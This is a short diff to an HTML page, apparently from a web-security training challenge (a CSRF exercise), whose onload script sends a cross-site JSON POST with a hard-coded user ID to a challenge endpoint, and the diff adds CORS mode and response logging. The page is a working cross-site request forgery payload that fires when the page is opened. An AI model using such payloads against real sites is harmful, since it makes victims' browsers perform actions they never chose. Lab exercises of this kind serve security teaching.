@@ -8,20 +8,22 @@
 </form>
 <script>
   window.onload = function(){
-    var userId = "398a2626d934ee0e28e46e4c5d5c1cab10e1a9b8";
-    var jsonD = JSON.stringify({userId:userId});
     fetch('https://shepherd.websec.dedyn.io/user/csrfchallengejson/plusplus', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
-      body: jsonD
+      body: JSON.stringify({ userId: '398a2626d934ee0e28e46e4c5d5c1cab10e1a9b8' }),
+      mode: 'cors',
     })
     .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error('Error:', error));
   };
 </script>
 </body>
 </html>
+
 
 
 
